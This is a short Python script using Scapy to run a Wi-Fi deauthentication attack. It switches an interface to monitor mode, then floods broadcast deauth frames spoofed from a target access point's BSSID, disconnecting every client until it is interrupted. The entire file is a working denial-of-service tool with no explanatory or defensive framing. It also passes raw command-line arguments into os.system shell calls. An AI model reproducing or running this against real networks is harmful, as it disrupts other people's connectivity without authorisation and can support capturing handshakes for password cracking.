import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import os
import time

def main(iface, bssid):
        run = True
        # make sure device is in monitor mode
        os.system("sudo ifconfig " + iface + " down")
        os.system("sudo iwconfig " + iface + " mode monitor")
        os.system("sudo ifconfig " + iface + " up")

        # creating deauth packet to send
        time.sleep(2)
        packet = (
            RadioTap() /
            Dot11(
                type=0, addr1="ff:ff:ff:ff:ff:ff",
                addr2=bssid,
                addr3=bssid) / Dot11Deauth()
        )
        print("Sending Deauthentication Packets")
        print("Use control+c to stop")
        while run:
            try:
                sendp(packet, iface=iface, verbose=False)
            except KeyboardInterrupt:
                run = False
                os.system("sudo ifconfig " + iface + " down")
                os.system("sudo ifconfig " + iface + " up")
                print("Deauthentication has stopped")

if __name__ == '__main__':
    iface = sys.argv[1]
    bssid = sys.argv[2]
    main(iface,bssid)
        
